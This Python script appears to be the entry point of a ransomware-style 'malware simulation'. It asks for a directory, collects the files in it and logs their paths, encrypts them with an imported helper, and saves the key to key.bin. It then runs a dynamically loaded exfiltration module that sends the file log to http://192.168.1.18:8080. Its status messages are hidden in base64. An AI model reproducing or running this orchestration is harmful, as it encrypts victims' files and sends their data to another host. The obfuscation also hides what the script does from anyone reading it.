import os as O
import sys as S
import base64 as B
import importlib.util as I

from test import collect_files as A
from encryption import encrypt_files as B1, save_key as B2

# --- Dynamic import for exfil script ---
N, P = "x", "exfil script.py"
spec = I.spec_from_file_location(N, P)
X = I.module_from_spec(spec)
S.modules[N] = X
spec.loader.exec_module(X)
R = X.run_exfiltration

def M():
    p = input(B.b64decode(b'8J+SqSBFbnRlciB0aGUgZGlyZWN0b3J5IHRvIHNlYXJjaDog').decode()).strip()

    print(B.b64decode(b'WypdIENvbGxlY3RpbmcgdGFyZ2V0IGZpbGVzLi4u').decode())
    f = A(p)

    if not f:
        print(B.b64decode(b'Wy1dIE5vIG1hdGNoaW5nIGZpbGVzIGZvdW5kLg==').decode())
        return

    with open("files.log", "w") as L:
        for i in f:
            L.write(i + "\n")

    print(B.b64decode(b'WypdIEVuY3J5cHRpbmcgZmlsZXMuLi4=').decode())
    k = B1(f)
    B2(k, "key.bin")

    print(B.b64decode(b'WypdIEV4ZmlsdHJhdGluZyBsb2cgZmlsZS4uLg==').decode())
    R("files.log", "http://192.168.1.18:8080")

    print(B.b64decode(b'W+Kckl0gTWFsd2FyZSBzaW11bGF0aW9uIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHku').decode())

if __name__ == "__main__":
    M()
